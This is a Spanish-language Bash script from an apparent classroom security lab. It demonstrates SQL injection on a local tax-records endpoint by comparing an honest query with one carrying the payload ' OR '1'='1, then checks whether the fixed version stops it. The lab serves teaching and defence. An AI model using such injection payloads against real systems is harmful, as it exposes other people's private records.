#!/usr/bin/env bash
# =============================================================================
#  91-demo-inyeccion.sh — el apóstrofe, en vivo
# -----------------------------------------------------------------------------
#    ./bin/91-demo-inyeccion.sh                  # sobre starter/  (el crimen)
#    ./bin/91-demo-inyeccion.sh --dir solucion   # sobre solución/ (el apóstrofe muerto)
#
#  Dos peticiones al MISMO endpoint. La única diferencia entre ellas es un
#  apóstrofe y cuatro caracteres más.
#
#  · La honesta   ?rut=11111111-1              -> las observaciones de Valentina
#  · La maliciosa ?rut=11111111-1' OR '1'='1   -> en el starter, TODAS las de la
#                                                 base, incluidas las de otro
#                                                 contribuyente
#
#  La inyección es de SOLO LECTURA a propósito: el punto pedagógico no necesita
#  destruir nada, y una demo que borra datos es una demo que nadie repite.
#
#  Este script NO levanta ni baja la aplicación: la quiere ya arriba. Así el
#  instructor puede proyectar el golpe sin esperar un arranque.
#      ./bin/start-lab.sh                 (y al terminar, ./bin/99-destruir.sh)
# =============================================================================
set -uo pipefail

DIR_BIN="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source-path=SCRIPTDIR
# shellcheck source=../../lib/lib-comunes.sh
. "$DIR_BIN/../../lib/lib-comunes.sh"

PUERTO="$DGT_PUERTO_DEFECTO"
OBJETIVO="starter"

es_numero() { printf '%s' "${1:-}" | grep -q '^[0-9][0-9]*$'; }

while [ $# -gt 0 ]; do
    case "$1" in
        --puerto)   PUERTO="${2:-}"; es_numero "$PUERTO" || { printf '[ERROR] --puerto necesita un número\n' >&2; exit 2; }; shift 2 ;;
        --puerto=*) PUERTO="${1#*=}"; es_numero "$PUERTO" || { printf '[ERROR] --puerto necesita un número\n' >&2; exit 2; }; shift ;;
        --dir)      OBJETIVO="${2:-}"; shift 2 ;;
        --dir=*)    OBJETIVO="${1#*=}"; shift ;;
        -h|--help)  printf 'Uso: %s [--dir starter|solucion] [--puerto N]\n' "$(basename "$0")"; exit 0 ;;
        *) printf '[ERROR] Argumento no reconocido: %s\n' "$1" >&2; exit 2 ;;
    esac
done

BASE="http://localhost:$PUERTO/api/internal/observaciones"

printf '\n  El apóstrofe · %s\n\n' "$OBJETIVO"

if ! curl -sS -m 10 -o /dev/null "http://localhost:$PUERTO/actuator/health" 2>/dev/null; then
    paso_fail "La DGT no responde en el puerto $PUERTO" \
              "Levántala primero:  ./bin/start-lab.sh --dir $OBJETIVO"
    printf '\n'; exit 1
fi

# `--data-urlencode` con `-G` deja que curl codifique el valor: el apóstrofe y los
# espacios viajan como los mandaría un navegador, no como los rompería el shell.
consultar() { curl -sS -m 20 -G "$BASE" --data-urlencode "rut=$1"; }
cuantas()   { printf '%s' "$1" | grep -o '"texto"' | wc -l | tr -d ' '; }

RUT_HONESTO="11111111-1"
RUT_MALICIOSO="11111111-1' OR '1'='1"

printf '  ── 1 · La consulta honesta ──────────────────────────────────────────\n\n'
printf '     GET /api/internal/observaciones?rut=%s\n\n' "$RUT_HONESTO"
R1="$(consultar "$RUT_HONESTO")"
N1="$(cuantas "$R1")"
printf '%s\n' "$R1" | sed 's/},{/},\n     {/g' | sed 's/^/     /'
printf '\n     -> %s observación(es). Todas de Valentina Rojas.\n\n' "$N1"

printf '  ════════════════════════════════════════════════════════════════════\n'
printf '   Ahora lo mismo, con un apóstrofe de más.\n'
printf '  ════════════════════════════════════════════════════════════════════\n\n'

printf '  ── 2 · La consulta con el apóstrofe ─────────────────────────────────\n\n'
printf "     GET /api/internal/observaciones?rut=%s\n\n" "$RUT_MALICIOSO"
R2="$(consultar "$RUT_MALICIOSO")"
N2="$(cuantas "$R2")"
printf '%s\n' "$R2" | sed 's/},{/},\n     {/g' | sed 's/^/     /'
printf '\n     -> %s observación(es).\n\n' "$N2"

printf '  ────────────────────────────────────────────────────────────────────\n'
if [ "$N2" -gt "$N1" ]; then
    paso_warn "La consulta maliciosa devolvió $N2 en vez de $N1" \
              "El apóstrofe cerró la comilla del SQL y el resto pasó a ser CÓDIGO. Ahí hay observaciones de otro contribuyente."
    printf '\n     Eso es el crimen. Empieza por el README.\n\n'
elif [ "$N2" -eq 0 ]; then
    paso_ok "La consulta maliciosa devolvió 0" \
            "El RUT viajó como PARÁMETRO: el motor buscó a alguien con ese RUT literal y no lo encontró."
    printf '\n     El apóstrofe dejó de ser código.\n\n'
else
    paso_warn "Resultado inesperado: honesta=$N1, maliciosa=$N2" \
              "Revisa que la aplicación levantada sea la que crees ($OBJETIVO)."
    printf '\n'
fi
